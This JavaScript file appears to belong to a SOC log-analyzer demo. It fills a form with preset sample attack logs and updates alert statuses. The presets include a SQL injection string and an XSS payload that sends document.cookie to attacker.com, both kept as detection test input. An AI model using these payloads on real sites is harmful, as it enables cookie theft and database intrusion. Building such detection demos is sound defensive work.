/**
 * CyberSOC Main JS - Log Analyzer Presets & Interactive UI Utilities
 */

document.addEventListener('DOMContentLoaded', function() {
    initPresets();
    initAlertStatusDropdowns();
});

const ATTACK_PRESETS = {
    sqli: {
        raw_log: "GET /products.php?id=1' OR '1'='1 -- HTTP/1.1 User-Agent: sqlmap/1.6",
        source_ip: "185.220.101.5",
        username: "unknown",
        category: "Web Security",
        log_level: "CRITICAL"
    },
    xss: {
        raw_log: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>",
        source_ip: "45.146.164.20",
        username: "victim_account",
        category: "Web Security",
        log_level: "ERROR"
    },
    bruteforce: {
        raw_log: "sshd[9812]: Failed password for invalid user admin from 185.220.101.5 port 49120 ssh2",
        source_ip: "185.220.101.5",
        username: "admin",
        category: "Authentication",
        log_level: "WARNING"
    },
    portscan: {
        raw_log: "[IDS-ALERT] Nmap SYN Scan detected: 1024 sequential ports probed on 10.0.0.15",
        source_ip: "45.154.255.80",
        username: "N/A",
        category: "Network Security",
        log_level: "WARNING"
    },
    malicious_ip: {
        raw_log: "[FIREWALL-EGRESS] Outbound session established to C2 Server 45.154.255.99 on port 4444",
        source_ip: "45.154.255.99",
        username: "system",
        category: "Network Security",
        log_level: "CRITICAL"
    },
    normal: {
        raw_log: "[NGINX-ACCESS] 192.168.1.45 - - [GET /dashboard HTTP/1.1] 200 3420",
        source_ip: "192.168.1.45",
        username: "john.doe",
        category: "System",
        log_level: "INFO"
    }
};

function initPresets() {
    const presetButtons = document.querySelectorAll('.preset-btn');
    if (!presetButtons.length) return;

    const rawLogInput = document.getElementById('raw_log');
    const sourceIpInput = document.getElementById('source_ip');
    const usernameInput = document.getElementById('username');
    const categorySelect = document.getElementById('category');

    presetButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const key = this.dataset.preset;
            if (ATTACK_PRESETS[key]) {
                const data = ATTACK_PRESETS[key];
                if (rawLogInput) rawLogInput.value = data.raw_log;
                if (sourceIpInput) sourceIpInput.value = data.source_ip;
                if (usernameInput) usernameInput.value = data.username;
                if (categorySelect) categorySelect.value = data.category;
            }
        });
    });
}

function initAlertStatusDropdowns() {
    const statusSelects = document.querySelectorAll('.status-change-select');
    statusSelects.forEach(select => {
        select.addEventListener('change', async function() {
            const alertId = this.dataset.alertId;
            const newStatus = this.value;

            try {
                const res = await fetch(`/alerts/${alertId}/status`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ status: newStatus })
                });

                if (res.ok) {
                    // Update badge style dynamically
                    this.className = `form-select form-select-sm status-change-select status-${newStatus.toLowerCase()}`;
                }
            } catch (err) {
                console.error('Failed to update alert status:', err);
            }
        });
    });
}
